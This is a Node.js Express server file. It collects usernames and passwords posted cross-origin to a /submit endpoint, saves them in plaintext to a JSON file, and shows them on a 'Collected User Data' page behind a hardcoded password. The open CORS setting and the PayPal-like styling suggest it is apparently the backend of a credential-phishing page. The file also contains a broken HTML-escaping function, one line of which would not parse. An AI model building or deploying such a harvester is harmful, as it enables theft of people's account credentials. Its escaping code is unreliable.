const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors'); // Add CORS
const app = express();
const port = process.env.PORT || 3000; // Use Render's PORT env variable

// Set a password (in a real app, this should be stored securely in environment variables)
const VIEW_PASSWORD = 'admin123'; // Change this to your desired password

// Middleware
app.use(cors()); // Enable CORS for all routes
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // For parsing form data
app.use(express.static(path.join(__dirname, 'public')));

// File path for storing data
const dataFile = path.join(__dirname, 'data', 'users.json');

// Ensure data directory and file exist
if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'));
}
if (!fs.existsSync(dataFile)) {
    fs.writeFileSync(dataFile, '[]');
}

// Endpoint to handle form submission
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    let data = JSON.parse(fs.readFileSync(dataFile));
    
    const newEntry = {
        username,
        password,
        timestamp: new Date().toISOString()
    };
    
    data.push(newEntry);
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    
    res.json({ success: true });
});

// Root URL - Password form page
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enter Password</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh; 
                    margin: 0;
                }
                .login-box {
                    background: #fff;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                    width: 300px;
                }
                input {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #0070ba;
                    border-radius: 5px;
                    box-sizing: border-box;
                }
                button {
                    background: #0070ba;
                    color: #fff;
                    padding: 10px;
                    border: none;
                    border-radius: 25px;
                    width: 100%;
                    cursor: pointer;
                }
                .error {
                    color: #0070ba;
                    font-size: 14px;
                    margin-top: 10px;
                    text-align: center;
                    display: none;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>Enter Password</h2>
                <form method="POST" action="/">
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">View Data</button>
                    <div class="error" id="error">Incorrect password</div>
                </form>
            </div>
        </body>
        </html>
    `);
});

// Handle password submission and show data at root URL
app.post('/', (req, res) => {
    const { password } = req.body;
    
    if (password !== VIEW_PASSWORD) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Enter Password</title>
                <style>
                    body { 
                        font-family: Arial, sans-serif; 
                        display: flex; 
                        justify-content: center; 
                        align-items: center; 
                        height: 100vh; 
                        margin: 0;
                    }
                    .login-box {
                        background: #fff;
                        padding: 20px;
                        border-radius: 10px;
                        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                        width: 300px;
                    }
                    input {
                        width: 100%;
                        padding: 10px;
                        margin: 10px 0;
                        border: 1px solid #0070ba;
                        border-radius: 5px;
                        box-sizing: border-box;
                    }
                    button {
                        background: #0070ba;
                        color: #fff;
                        padding: 10px;
                        border: none;
                        border-radius: 25px;
                        width: 100%;
                        cursor: pointer;
                    }
                    .error {
                        color: #0070ba;
                        font-size: 14px;
                        margin-top: 10px;
                        text-align: center;
                        display: block;
                    }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>Enter Password</h2>
                    <form method="POST" action="/">
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">View Data</button>
                        <div class="error" id="error">Incorrect password</div>
                    </form>
                </div>
            </body>
            </html>
        `);
    }

    // If password is correct, show the data
    const data = JSON.parse(fs.readFileSync(dataFile));
    let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Collected Data</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                table { border-collapse: collapse; width: 100%; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; }
            </style>
        </head>
        <body>
            <h1>Collected User Data</h1>
            <table>
                <tr>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Timestamp</th>
                </tr>
    `;
    
    data.forEach(entry => {
        html += `
            <tr>
                <td>${escapeHtml(entry.username)}</td>
                <td>${escapeHtml(entry.password)}</td>
                <td>${escapeHtml(entry.timestamp)}</td>
            </tr>
        `;
    });
    
    html += `
            </table>
        </body>
        </html>
    `;
    
    res.send(html);
});

// HTML escape function
function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&")
         .replace(/</g, "<")
         .replace(/>/g, ">")
         .replace(/"/g, """)
         .replace(/'/g, "'");
}

app.listen(port, () => {
    console.log(`Server running at port ${port}`);
});
